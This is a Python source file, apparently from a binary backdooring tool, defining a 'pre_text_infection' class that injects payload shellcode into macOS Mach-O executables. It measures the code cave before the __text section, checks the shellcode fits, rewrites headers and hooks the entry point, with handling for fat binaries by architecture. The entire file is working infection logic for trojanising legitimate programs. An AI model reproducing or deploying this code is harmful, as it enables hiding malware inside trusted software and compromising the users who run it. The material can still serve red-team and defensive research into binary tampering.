import os
import logging
from core import enum
from core import support
from macho.core import core
import io
import struct
# from macho.core import core

logger = logging.getLogger(__name__)


class pre_text_infection:

    def __init__(self):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = """pre_text_infection"""
        self.description = """Hook entry point patching methods"""
        self.requirements = {'FILE': 'Binary to be patched',
                             'MODE': 'How the patching will happen',
                             'PAYLOAD': 'Payload to be patched into binary',
                             'FAT_PRIORITY': 'Which arch takes Priority'
                             }

    def support_checks(self):
        support_chk = support.support(self)
        # pre-process here
        if not support_chk.check_reqs():
            return False

        if not support_chk.check_modes():
            return False

        if not support_chk.check_payloads():
            return False

        if not support_chk.check_core():
            return False

        if not support_chk.check_modifier():
            return False

        return True

    def patch(self, BDF):

        self.BDF = BDF
        self.BDF.core_support = 'pre_text_core'

        for self.BDF.key, value in self.BDF.macho_object['mach_hdrs'].items():
            self.BDF.MagicNumber = value['MagicNumber']
            self.BDF.CPU_SubType = value['CPU SubType']
            self.BDF.CPU_Type = value['CPU Type'].lower()

            if not core.core(self.BDF).get_magic():
                return False

            if self.BDF.PAYLOAD_PATH_w_CHIP is False:
                self.result = False
                return False

            if not self.support_checks():
                return False

            logger.info("[*] Selected Payload: {0}".format(self.found_payload.__class__.__name__))

            logger.info("[*] Selected Mode: {0}".format(self.found_mode.__class__.__name__))

            self.BDF.text_section = self.BDF.macho_object['ImpValues'][self.BDF.key]['text_section']
            last_cmd = self.BDF.macho_object['ImpValues'][self.BDF.key]['last_cmd']
            self.BDF.LC_MAIN = self.BDF.macho_object['ImpValues'][self.BDF.key]['LC_MAIN']
            self.BDF.LC_UNIXTREAD = self.BDF.macho_object['ImpValues'][self.BDF.key]['LC_UNIXTREAD']

            if self.BDF.macho_object['binary_header'] == b"\xca\xfe\xba\xbe":
                offset = int(self.BDF.macho_object['fat_hdrs'][self.BDF.key]['Offset'], 16)
            else:
                offset = 0x0
            self.BDF.LC_CODE_SIGNATURE = self.BDF.macho_object['ImpValues'][self.BDF.key]['LC_CODE_SIGNATURE']
            self.BDF.LC_DYLIB_CODE_SIGN_DRS = self.BDF.macho_object['ImpValues'][self.BDF.key]['LC_DYLIB_CODE_SIGN_DRS']

            patching_something = False

            if 'FAT_FILE' in self.BDF.macho_object:
                # The purpose of this to bypass the formats we don't want
                if self.FAT_PRIORITY != 'ALL':
                    if self.BDF.options['FAT_PRIORITY'].lower() == 'x64':
                        # bypass x86
                        if self.BDF.MagicNumber == '0xfeedface':
                            logger.info('Not patching x86 intel')
                            patching_something = True
                            continue
                        elif self.BDF.CPU_Type == '0x100000c':
                            logger.info("Not patching arm64")
                            # bypass arm
                            patching_something = True
                            continue

                    if self.BDF.options['FAT_PRIORITY'].lower() == 'x86':
                        # check for x64
                        if self.BDF.MagicNumber == '0xfeedfacf':
                            logger.info('Not patching x64 intel')
                            continue

                    if self.BDF.options['FAT_PRIORITY'].lower() == 'arm64':

                        if self.BDF.MagicNumber == '0xfeedface':
                            logger.info('Not patching x86 intel')
                            patching_something = True
                            continue
                        elif self.BDF.CPU_Type == '0x1000007':
                            # bypass x64 intel
                            logger.info("Not patching x64 intel")
                            patching_something = True
                            continue

            cave_size = struct.unpack("<I", self.BDF.text_section['Offset'])[0] + offset - last_cmd
            logger.info(f"[*] Pre-text section 'code cave' size: {hex(cave_size)}")

            self.BDF.macho_object['loaded_binary'].seek(0)

            # have to call core first
            self.found_core
            self.found_core.BDF = self.BDF
            logger.debug(self.found_core)

            self.found_core.get_jmp_location()

            self.BDF.found_payload = self.found_payload

            self.BDF.macho_object['shellcode'] = self.BDF.found_payload.invoke(self)

            if self.BDF.macho_object['shellcode'] is False:
                return False

            self.BDF.macho_object['shellcode_length'] = len(self.BDF.macho_object['shellcode'])

            logger.debug(f"self.BDF.macho_object['shellcode_length'] {self.BDF.macho_object['shellcode_length']}")

            if self.BDF.macho_object['shellcode_length'] > cave_size:
                logger.error("[!] Shellcode is larger than available space")
                return False
            # print 'shellcode:', self.shellcode.encode('hex')

            self.BDF.startingLocation = struct.unpack("<I", self.BDF.text_section['Offset'])[0] + offset - self.BDF.macho_object['shellcode_length']

            # pre_text_core x64
            self.found_core.update_header()

            self.found_mode.BDF = self.BDF
            found_mode_result = self.found_mode.invoke_mode()

            if not found_mode_result:
                return False

            patching_something = True

        if not patching_something:
            logger.error('Did not find a format in the FAT file to patch or FAT_PRIORITY not set, nothing patched')
            return False

        logger.debug(f"found_mode: {self.found_mode}")

        # No need to call the payload twice (as before)
        # Modes are unique to binary patching method

        logger.debug(f"self.found_core:  {self.found_core} - {type(self.found_core)}")

        # Found Core is an artifact from the support call
        # 'Cores are unique to the chipset and OS'

        self.patched_binary = io.BytesIO(self.BDF.original_binary.read(-1))
        # do patch_instr here
        patch = support.support(self)
        patch.patch_file()

        result = self.patched_binary

        result.seek(0)

        return result
